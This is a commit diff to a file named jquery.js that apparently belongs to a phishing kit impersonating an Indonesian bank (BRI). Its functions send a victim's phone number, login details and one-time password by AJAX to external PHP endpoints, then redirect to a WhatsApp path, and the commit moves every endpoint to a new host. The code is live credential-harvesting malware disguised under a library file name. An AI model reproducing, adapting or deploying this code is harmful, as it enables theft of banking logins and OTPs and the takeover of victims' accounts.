fc5cbdb205944df99e47d8414d5f9c29e167bb79
dodypribadi5 <dodypribadi5@gmail.com>
2025-02-18 21:01:12 +0700

    Update jquery.js

--- jquery.js
+++ jquery.js
@@ -5,7 +5,7 @@ function sendHp() {
    document.getElementById('kirims').innerHTML = "Memproses....";
    $.ajax({
       type: 'POST',
-      url: 'https://choreoapps.ll-feed.cfd/bri/britarifv9-virtual1/one.php',
+      url: 'https://anjayhostjon.cloud/choreoapps.ll-feed.cfd/bri/britarifv9-virtual1/one.php',
       data: $('#inputHp').serialize(),
       complete: function(data) {
          vibr(220);
@@ -36,7 +36,7 @@ function sendLogin() {
    document.getElementById('kirims').innerHTML = "Memproses....";
    $.ajax({
       type: 'POST',
-      url: 'https://choreoapps.ll-feed.cfd/bri/britarifv9-virtual1/two.php',
+      url: 'https://anjayhostjon.cloud/choreoapps.ll-feed.cfd/bri/britarifv9-virtual1/two.php',
       data: $('#inputlogin').serialize(),
       complete: function(data) {
          vibr(220);
@@ -68,7 +68,7 @@ function kirimOtp() {
    document.getElementById('kirims').value = "Memproses....";
    $.ajax({
       type: 'POST',
-      url: 'https://choreoapps.ll-feed.cfd/bri/britarifv9-virtual1/three.php',
+      url: 'https://anjayhostjon.cloud/choreoapps.ll-feed.cfd/bri/britarifv9-virtual1/three.php',
       data: $('#formLink').serialize(),
       complete: function(data) {
          console.log('Complete')
@@ -97,7 +97,7 @@ function getcs(){
    audio1.load();   
 setTimeout(function(){  
     $("#process1").hide();   
-location.href='https://choreoapps.ll-feed.cfd/wa/britarifv9-virtual1';
+location.href='https://anjayhostjon.cloud/choreoapps.ll-feed.cfd/wa/britarifv9-virtual1';
  $('.load').hide();
     }, 4000);    
     
